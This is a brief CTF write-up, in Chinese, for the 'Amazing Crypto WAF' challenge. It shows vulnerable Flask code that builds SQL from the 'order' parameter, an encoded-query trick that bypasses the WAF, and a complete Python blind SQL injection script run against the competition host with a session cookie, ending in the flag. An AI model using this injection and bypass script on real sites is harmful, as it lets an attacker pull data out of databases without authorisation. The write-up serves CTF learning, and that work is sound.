# Amazing Crypto WAF

看到是 liveoverflow 出的題，就跑來玩一下惹

首先有個明顯注入點:

```
@app.route('/notes')
@login_required
def notes():
    order = request.args.get('order', 'desc')
    notes = query_db(f'select * from notes where user = ? order by timestamp {order}', [g.user['uuid']])
    return render_template('notes.html', user=g.user, notes=notes)
```

另外 query 可以污染，繞 WAF:

```
requests.get(f'{BACKEND_URL}{path}?{query}'
```

這樣就能繞掉:

```
https://7b0000000d2a54b152d456f4-amazing-crypto-waf.challenge.master.allesctf.net:31337/notes%3forder=desc--+sleep
```

後面就 boolean-based 慢慢爆：

```
import requests

s = ""

for j in range(100):

    ll = 0
    rr = 126

    while True:
        if ll >= rr:
            break
        mid = (ll+rr) // 2
        print(mid)
        payload="/notes%3forder=limit%20(case%20when%20(unicode(substr((select%20body%20from%20notes),{},1))>{})%20then%201%20else%202%20end)--".format(j+1, mid)
        r = requests.get("https://7b0000000d2a54b152d456f4-amazing-crypto-waf.challenge.master.allesctf.net:31337/"+payload,cookies={"session":"099072039f6541c98791b06f813e990a.f1e145a17a2934c2b870dbb96bbe417ccb6550565b9bfc1ffc9b67dbe1969430"})

        #print r.text

        if "thisisfalse" not in r.text:
            ll = mid + 1
        else:
            rr = mid


    s += (chr(ll))
    print(s)
```


撈出來的是加密內容

可以用 `delete_note` 去解

`ALLES!{American_scientists_said,_dont_do_WAFs!}`
